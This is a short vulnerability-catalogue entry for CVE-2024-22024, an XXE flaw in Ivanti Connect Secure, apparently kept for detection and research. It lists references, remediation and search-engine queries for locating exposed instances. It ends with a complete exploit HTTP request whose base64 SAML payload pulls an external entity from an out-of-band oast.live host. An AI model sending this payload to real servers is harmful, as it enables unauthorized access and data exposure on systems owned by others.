---
layout: post
cve_id: CVE-2024-22024
title: Ivanti Connect Secure - XXE
pcap: true
pcap_path: /pcaps/2024/CVE-2024-22024.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-22024.yaml
snort2_rule: N/A
snort3_rule: N/A
author: watchTowr
severity: high
impact: 'Successful exploitation of this vulnerability could lead to unauthorized
  access to sensitive information or remote code execution.

  '
remediation: 'Apply the latest security patches or updates provided by Ivanti to fix
  the XXE vulnerability.

  '
reference:
- https://labs.watchtowr.com/are-we-now-part-of-ivanti/
- https://twitter.com/h4x0r_dz/status/1755849867149103106/photo/1
classification:
  epss-score: 0.94249
  epss-percentile: 0.99926
metadata:
  max-request: 1
  vendor: ivanti
  product: connect_secure
  shodan-query:
  - html:"welcome.cgi?p=logo"
  - http.title:"ivanti connect secure"
  - http.html:"welcome.cgi?p=logo"
  fofa-query:
  - body="welcome.cgi?p=logo"
  - title="ivanti connect secure"
  google-query: intitle:"ivanti connect secure"
tags:
- cve
- cve2024
- xxe
- ivanti
- vkev
- vuln
---

## üîç Vulnerability Description
Ivanti Connect Secure is vulnerable to XXE (XML External Entity) injection.


## üåê HTTP Request
```nohighlight
POST /dana-na/auth/saml-sso.cgi HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0
Connection: close
Content-Length: 204
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

SAMLRequest=PD94bWwgdmVyc2lvbj0iMS4wIiA/PjwhRE9DVFlQRSByb290IFs8IUVOVElUWSAlIHdhdGNoVG93ciBTWVNURU0gImh0dHA6Ly9kNWlwcWxobGUwbzI0YTNqM2FiZ3A2cW1wb2djamZxZjkub2FzdC5saXZlL3giPiAld2F0Y2hUb3dyO10+PHI+PC9yPg==
```

